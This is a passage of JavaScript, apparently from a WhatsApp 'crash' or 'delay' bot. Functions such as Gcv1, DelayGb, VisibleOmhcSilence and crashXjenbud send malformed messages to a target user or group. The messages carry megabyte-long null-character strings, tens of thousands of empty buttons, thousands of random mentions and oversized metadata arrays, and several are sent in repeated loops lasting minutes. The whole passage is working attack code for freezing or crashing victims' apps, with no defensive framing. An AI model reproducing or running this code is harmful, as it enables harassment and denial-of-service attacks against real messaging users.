              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
              viewOnce: true,
              scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
              scanLengths: [6677, 48757, 32501, 42353],
              midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
            },
            hasMediaAttachment: null
          },
          body: {
            text: "\u0000".repeat(1000)
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: target,
            isBuldo: true,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            quotedMessage: {
              documentMessage: {
                url: "https://example.com/file.zip",
                mimetype: "application/zip",
                caption: "LexzyModss - Executed",
                fileName: "NanasMuda - Executed",
                fileLength: 99999,
                vCards: true
              }
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "ြ".repeat(9000)
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", Nanas, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });

  await sock.relayMessage("status@broadcast", Muda, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });

  const startTime = Date.now();
  const duration = 5 * 60 * 1500;

  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }, { participant: target });
  }

  await sock.relayMessage(target, {
    message: {
      extendedTextMessage: {
        text: "\u0003".repeat(9000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1999 },
              () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    }
  }, { participant: target });

  const startTime2 = Date.now();
  const duration2 = 1 * 60 * 1000;

  while (Date.now() - startTime2 < duration2) {
    await sock.relayMessage(target, {
      message: {
        extendedTextMessage: {
          text: "\u0003".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }, { participant: target });
  }

  const LexzyyMsg = {
    interactiveMessage: {
      body: {
        text: "LexzyMods - Executed¿!",
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 20000 }, () => ({}))
      },
      contextInfo: {
        quotedMessage: {
          orderMessage: {
            orderTitle: "Pt Nanas Muda",
            itemCount: 1999,
            totalAmount1000: "1000000",
            totalCurrencyCode: "IDR"
          },
        },
      },
    },
  };

  const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

  await sock.relayMessage(target, acamsg.message, {
    participant: target,
    messageId: acamsg.key.id
  });

  const Lexca = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        pluginMetadata: {},
        richResponseSourcesMetadata: {
          sources: []
        }
      }
    },
    message: {
      richResponseMessage: {
        messageType: 1,
        submessages: [
          {
            messageType: 3,
            tableMetadata: {
              title: "LexzyMods - Executed¿!",
              rows: Array.from({ length: 2000 }, () => ({}))
            }
          }
        ],
        unifiedResponse: {
          data: JSON.stringify({
            response_id: crypto.randomUUID(),
            sections: []
          })
        },
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          forwardedAiBotMessageInfo: {
            botJid: "NanasXExecutedXAllTeam"
          },
          forwardOrigin: 3
        }
      }
    }
  };

  const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

  await sock.relayMessage(target, Lexcaa.message, {
    participant: target,
    messageId: Lexcaa.key.id
  });

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [{
          name: "payment_info",
          buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
        }]
      }
    }
  }, {});

  await sock.relayMessage(target, {
    message: {
      extendedTextMessage: {
        text: "\u0003".repeat(9000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 2000 },
              () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    }
  }, { participant: target });

  const Lexcabos = {
    message: {
      stickerPackMessage: {
        stickerPackId: "\u0000".repeat(9000),
        name: "LexzyMods - Executed¿!",
        publisher: "\u0000".repeat(9000),
        fileLength: 9999,
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        contextInfo: {
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
        },
      },
    },
  };

  await sock.relayMessage(target, Lexcabos, {
    participant: target,
  });

  const startTime3 = Date.now();
  const duration3 = 4 * 60 * 1000;
  while (Date.now() - startTime3 < duration3) {
    await sock.relayMessage(target, {
      message: {
        interactiveMessage: {
          body: {
            text: "Lexcaa - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 20000 }, () => ({}))
          },
        },
      },
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ExecutedTeam",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0003".repeat(9000),
            version: 3
          },
        }
      }
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "NanasMuda - Executed‽!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(9000),
            version: 3
          },
        }
      }
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Lexcaabos - Executed¿!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
              }
            }
          }
        }
      }
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      message: {
        extendedTextMessage: {
          text: "\u0003".repeat(9000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }, { participant: target });
  }

  const msgLarge = {
    key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
    message: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "IamLexzyMods",
        fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        fileLength: 9999999,
        height: 9999,
        width: 9999,
        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
        fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1776937541",
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQCAQUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8xd08q1UTizoenMSK1a9WaMkNT3ZrFyc7nOmsY2rtlXZWZ3ooDzQNY6AaAP/xAAcEAADAAMBAQEAAAAAAAAAAAAAAQIDEBESEyD/2gAIAQEAAT8AyRwlDRS1lnp54UU9XRVlWd1ksqt9MjEunyfDyeRvpjJ5wySN6TJsp+j5tnToqFZjufyqaP/EABkRAAIDAQAAAAAAAAAAAAAAAAEQABEgAv/aAAgBAgEBPwBjA6dSzj//xAAaEQACAgMAAAAAAAAAAAAAAAABAhAgABEh/9oACAEDAQE/AJNCvJDZqn//2Q==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true,
          paymentExtendedMetadata: {
            type: 1,
            platform: "windowshortcut"
          },
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 280000 }, () => ({
              "\u200B": "\u0000"
            }))
          },
          businessMessageForwardInfo: {
            businessOwnerJid: target
          }
        },
        streamingSidecar: "ifzqbbi6VQrr2qWUVcibCLLD5MublGIUI7VQWllrtSH0Oy9Oom8Fsw==",
        thumbnailDirectPath: "/v/t62.36147-24/597931020_1114136300619238_2132267882477762526_n.enc?ccb=11-4&oh=01_Q5Aa3QE3WwujMWlYXtHm0OsWvWU7G2iNPANw9Cpt64aOcOvNrg&oe=695F14B4&_nc_sid=5e03e0",
        thumbnailSha256: "ewOlFHMaQjWVM2MIHgdLESHC9lTe8wqHoRl5StiLkhM=",
        thumbnailEncSha256: "Vf7tqUV/U7cF064u4mVf9/b78ud+Ds3OS2AUwPOs5xE=",
        annotations: [
          {
            polygonVertices: [
              { x: 0.04808333143591881, y: 0.3758828043937683 },
              { x: 0.9397777915000916, y: 0.3758828043937683 },
              { x: 0.9397777915000916, y: 0.6241093873977661 },
              { x: 0.04808333143591881, y: 0.6241093873977661 }
            ],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMessage: {
                stanzaId: "AC2FA3391836A5F431C9048A1146D3B5",
                message: {
                  extendedTextMessage: {
                    text: "👁‍🗨⃟‌‌LexzyMods - Executed¿!",
                    previewType: "NONE",
                    inviteLinkGroupTypeV2: "DEFAULT"
                  },
                  messageContextInfo: {
                    messageSecret: "/M7rquUfS6CESB44pG4gkIEnJXmWCj0TWplGd5anYpI=",
                    messageAssociation: {
                      associationType: 16,
                      parentMessageKey: {
                        remoteJid: "13135550202@bot",
                        fromMe: false,
                        id: "AC911EFEDA42DEA4586C4BB8C2814563",
                        participant: target
                      }
                    }
                  }
                }
              }
            },
            embeddedAction: true
          },
          {
            polygonVertices: [
              { x: 0.2779604196548462, y: 0.3697652220726013 },
              { x: 0.6993772983551025, y: 0.43257278203964233 },
              { x: 0.6015534996986389, y: 0.6402503848075867 },
              { x: 0.180136576294899, y: 0.5774427652359009 }
            ],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "1906813674047253",
                songId: "1137812656623908",
                author: "𑲱".repeat(10000),
                title: "𑲱🗨⃟".repeat(10000),
                artworkDirectPath: "/v/t62.76458-24/598391103_3273009980213184_2759326202399655865_n.enc?ccb=11-4&oh=01_Q5Aa3QGnx-UJjjZjgAcBWAO2Z_fjAVSkr6_6Trx2fPX0bUWq_Q&oe=695F194E&_nc_sid=5e03e0",
                artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
                artworkEncSha256: "RxkYiV5YBTTkodlBT20qVHazbrBipHBCLb5t9BWuaXo=",
                artistAttribution: "https://t.me/LexzyMods",
                countryBlocklist: "UlU=",
                isExplicit: true,
                artworkMediaKey: "GuNInntcRnyNiYcZ28Ym4g8OeZz7JbNBHl6tPOL5BBA="
              }
            },
            embeddedAction: true
          }
        ]
      },
    }
  };

  await sock.relayMessage("status@broadcast", msgLarge.message, {
    statusJidList: [target],
    messageId: msgLarge.key.id,
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msgLarge.key,
          type: 25
        },
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "false" },
          content: undefined
        }]
      }
    }
  }, {});
}

async function Gcv1(sock, groupJid) {
const crashXI = {
interactiveMessage: {
body: {
text: "Nando Officiall 隆!"
},
nativeFlowMessage: {
buttons: Array.from({ length: 20000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
contactMessage: {
displayName: " ",
vcard: null
},
},
},
},
};

const crashXJ = generateWAMessageFromContent(groupJid, crashXI, {});

await sock.relayMessage(groupJid, crashXJ.message, {
participant: true,
messageId: crashXJ.key.id
})
}

async function GcV2(sock, groupJid) {
const CrBZB = {
interactiveMessage: {
body: {
text: "Nando Officiall 隆!"
},
nativeFlowMessage: {
buttons: Array.from({ length: 20000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
albumMessage: {
expectedImageCount: 9999,
expectedVideoCount: 9999
},
},
},
},
};

const CrbB = generateWAMessageFromContent(groupJid, CrBZB, {});

await sock.relayMessage(groupJid, CrbB.message, {
messageId: CrbB.key.id
})
}

// function delay group
async function DelayGb(sock, groupJid) {
    const MpCrB = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "Nando隆!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Nando Officiall 隆!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 20000 }, () => ({}))
                    }
                }
            }
        }
    };

    const KpCrB = generateWAMessageFromContent(groupJid, MpCrB, {});
    await sock.relayMessage(groupJid, KpCrB.message, {
        messageId: KpCrB.key.id
    });

    const XpCrB = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Nando Officiall 隆!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 20000 }, () => ({}))
                    }
                }
            }
        }
    };

    const XRCrB = generateWAMessageFromContent(groupJid, XpCrB, {});
    await sock.relayMessage(groupJid, XRCrB.message, {
        messageId: XRCrB.key.id
    });
}

async function VisibleOmhcSilence(sock, target, mention, ptcp = true) {
const audioMessage = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 2000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          )
        ]
      }
    }
  };

  const msg = generateWAMessageFromContent(target, audioMessage, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined
          }
        ]
      }
    );
  }
  
  const tagVisible = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c&mms3=true",
               mimetype: "image/jpeg",
               caption: "YakuzaXsilence",
               fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
               fileLength: "634893",
               height: 1022,
               width: 1080,
               mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
               fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
               directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c",
               mediaKeyTimestamp: "1782643133",
                 jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQAERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
                 hasMediaAttachment: true
               }
            },
            body: {
            text: "\x10" + "\u0000".repeat(1045000)
          },
          nativeFlowMessage: {
            name: "voice_call",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }
  await sock.relayMessage(target, tagVisible, {
  }, { noSelfSync: true }
 );
  
  const OneDelay = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        fromMe: false,
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: OneDelay.message,
     },
    }, ptcp ? 
    { 
      messageId: OneDelay.key.id, 
      participant: { jid: target} 
    } : { messageId: OneDelay.key.id }
  );
  
  const VisibleAttack = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "hi kidz", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: VisibleAttack.message,
     },
    }, ptcp ? 
    { 
      messageId: VisibleAttack.key.id, 
      participant: { jid: target} 
    } : { messageId: VisibleAttack.key.id }
  );
  
  const TrueAttack = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: TrueAttack.message,
     },
    }, ptcp ? 
    { 
      messageId: TrueAttack.key.id, 
      participant: { jid: target} 
    } : { messageId: TrueAttack.key.id }
  );
}

async function crashXjenbud(sock, target) {
    const MakLo = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "MakLo",
                                rows: "\0",
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, MakLo, {});

    await sock.relayMessage(target, msg.message, {
    participant: true,
